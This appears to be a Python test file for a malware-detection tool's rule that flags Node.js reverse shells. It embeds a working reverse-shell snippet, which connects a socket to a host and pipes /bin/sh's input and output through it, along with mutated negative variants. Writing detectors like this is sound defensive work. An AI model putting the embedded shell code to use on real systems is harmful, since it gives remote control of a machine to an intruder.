#!/usr/bin/env python3
"""Reverse-shell detection must bind both streams to the spawned shell."""
import json
import os
from pathlib import Path
import subprocess
import tempfile

ROOT = Path(__file__).resolve().parents[2]
CLEAVE = os.environ.get('CLEAVE', str(ROOT.parent / 'cleave/target/release/cleave'))
RULE = 'objectives/command-and-control/reverse-shell/stream-bridge::node-bound-net-socket-shell-relay'
SOURCE = '''var net = require('net');
var spawn = require('child_process').spawn;
function bridge(port, host) {
  var client = new net.Socket();
  client.connect(port, host, function() {
    var shell = spawn('/bin/sh', []);
    client.pipe(shell.stdin);
    shell.stdout.pipe(client);
  });
}
'''
cases = {
    'positive': (SOURCE, True),
    'other-child': (SOURCE.replace('client.pipe(shell.stdin)', 'client.pipe(other.stdin)'), False),
    'other-socket': (SOURCE.replace('shell.stdout.pipe(client)', 'shell.stdout.pipe(other)'), False),
    'not-shell': (SOURCE.replace("'/bin/sh'", "'/bin/cat'"), False),
    'other-spawn': (SOURCE.replace("var shell = spawn(", "var shell = other("), False),
    'other-module': (SOURCE.replace("require('net')", "require('other')"), False),
    'missing-output': (SOURCE.replace('shell.stdout.pipe(client);', ''), False),
}
with tempfile.TemporaryDirectory(prefix='node-shell-binding-') as tmp:
    paths = []
    for name, (source, _) in cases.items():
        path = Path(tmp) / (name + '.js')
        path.write_text(source)
        paths.append(str(path))
    result = subprocess.run([CLEAVE, '--traits-dir', str(ROOT), '--json', *paths],
                            check=True, capture_output=True, text=True,
                            env={**os.environ, 'CLEAVE_SKIP_CACHE': '1'})
    reports = [json.loads(line)['files'][0] for line in result.stdout.splitlines() if line]
    assert len(reports) == len(cases)
    for report in reports:
        name = Path(report['path']).stem
        found = any(t['id'] == RULE for t in report.get('traits', []))
        assert found == cases[name][1], (name, found, cases[name][1])
print('Node socket relay binds its shell process and both stream endpoints')
